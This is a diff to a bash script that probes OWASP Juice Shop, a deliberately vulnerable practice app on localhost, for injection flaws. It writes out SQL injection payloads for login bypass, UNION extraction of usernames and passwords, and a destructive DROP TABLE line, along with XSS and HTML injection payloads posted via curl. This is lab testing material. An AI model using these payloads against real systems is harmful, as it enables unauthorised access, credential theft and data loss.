@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Base URL of the target application (Modify as needed)
+# Base URL of the target application
 BASE_URL="http://localhost:3000"
 
 # Function to check if target is online
@@ -14,17 +14,15 @@ function check_target() {
     fi
 }
 
-# Function to test SQL Injection (More aggressive payloads)
+# Function to test SQL Injection in OWASP Juice Shop
 function test_sql_injection() {
-    echo "[*] Testing for SQL Injection..."
+    echo "[*] Testing for SQL Injection in OWASP Juice Shop..."
 
     SQLI_PAYLOADS=(
         "' OR '1'='1' --"
         "' OR 1=1 --"
-        "' OR 'a'='a' --"
         "' UNION SELECT null, version(), null --"
-        "' UNION SELECT username, password FROM users --"
-        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+        "' UNION SELECT username, email, password FROM Users --"
         "'; DROP TABLE users; --"
     )
 
@@ -35,38 +33,38 @@ function test_sql_injection() {
 
         echo "[*] Testing payload: $PAYLOAD"
 
-        # Check if authentication succeeded
-        if echo "$response" | grep -q "authentication succeeded"; then
-            echo "[🔥] SQL Injection vulnerability detected with payload: $PAYLOAD"
+        # Check if response contains a JWT token (indicating a successful login bypass)
+        if echo "$response" | jq -e '.authentication | .token' > /dev/null 2>&1; then
+            echo "[🔥] SQL Injection vulnerability detected! Login bypass successful with payload: $PAYLOAD"
             return
         fi
 
-        # Check if an SQL error is revealed
-        if echo "$response" | grep -iE "SQL syntax|mysql_fetch|error in your SQL|warning: mysql|Unclosed quotation mark"; then
+        # Check if response contains any SQL error messages
+        if echo "$response" | grep -iE "SQL syntax|database error|sqlite error|pg error|unclosed quotation mark"; then
             echo "[🔥] SQL Error-based Injection detected with payload: $PAYLOAD"
             return
         fi
     done
 
-    echo "[-] No SQL Injection detected."
+    echo "[-] No SQL Injection detected in Juice Shop."
 }
 
 # Function to test XSS
 function test_xss() {
     echo "[*] Testing for XSS vulnerabilities..."
     
-    response=$(curl -s -X POST "$BASE_URL/feedback" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        --data-urlencode "comment=<script>alert('XSS')</script>")
+    response=$(curl -s -X POST "$BASE_URL/api/Feedbacks" \
+        -H "Content-Type: application/json" \
+        -d '{"comment": "<script>alert(\"XSS\")</script>"}')
 
-    if echo "$response" | grep -q "<script>alert('XSS')</script>"; then
+    if echo "$response" | grep -q "<script>alert(\"XSS\")</script>"; then
         echo "[🔥] XSS vulnerability detected!"
     else
         echo "[-] No XSS detected."
     fi
 }
 
-# Function to check CSRF vulnerability
+# Function to test CSRF vulnerability
 function test_csrf() {
     echo "[*] Testing for CSRF vulnerabilities..."
     
@@ -85,9 +83,9 @@ function test_csrf() {
 function test_html_injection() {
     echo "[*] Testing for HTML Injection..."
     
-    response=$(curl -s -X POST "$BASE_URL/feedback" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        --data-urlencode "comment=<h1>Hacked!</h1>")
+    response=$(curl -s -X POST "$BASE_URL/api/Feedbacks" \
+        -H "Content-Type: application/json" \
+        -d '{"comment": "<h1>Hacked!</h1>"}')
 
     if echo "$response" | grep -q "<h1>Hacked!</h1>"; then
         echo "[🔥] HTML Injection vulnerability detected!"
@@ -98,7 +96,7 @@ function test_html_injection() {
 
 # Main Function
 function main() {
-    echo "===== Starting Enhanced Bash Security Scanner ====="
+    echo "===== Starting Enhanced Bash Security Scanner for OWASP Juice Shop ====="
     
     check_target
     test_sql_injection
@@ -111,4 +109,3 @@ function main() {
 
 # Execute main function
 main
-
